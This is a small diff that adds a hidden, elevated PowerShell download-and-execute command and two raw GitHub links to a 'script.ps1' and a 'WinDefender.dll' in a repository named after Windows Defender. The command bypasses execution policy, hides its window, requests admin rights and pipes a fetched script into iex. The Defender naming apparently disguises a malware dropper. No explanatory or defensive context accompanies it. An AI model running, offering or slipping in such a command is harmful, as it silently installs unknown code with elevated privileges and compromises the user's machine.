@@ -1,0 +1,4 @@
+powershell -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command iwr -Uri http://localhost/script.ps1 -UseBasicParsing | iex' -Verb RunAs  -WindowStyle Hidden"
+
+https://raw.githubusercontent.com/steamworker/Defender/refs/heads/main/script.ps1
+https://raw.githubusercontent.com/steamworker/Defender/refs/heads/main/WinDefender.dll
